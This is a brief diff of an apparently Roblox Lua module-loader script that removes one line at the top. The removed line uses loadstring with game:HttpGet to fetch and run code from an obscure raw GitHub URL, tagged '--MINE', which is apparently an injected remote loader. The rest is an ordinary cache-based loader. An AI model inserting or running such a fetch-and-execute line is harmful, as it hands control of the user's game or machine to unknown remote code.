@@ -1,5 +1,4 @@
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/orjpforkespoS0U0S0S0S0II/oidfgoit777/refs/heads/main/load"))() --MINE
 local a a = {
     cache = {}, load = function(b)if not a.cache[b]then a.cache[b] = {
         c = a[b]()}end return a.cache[b].c end
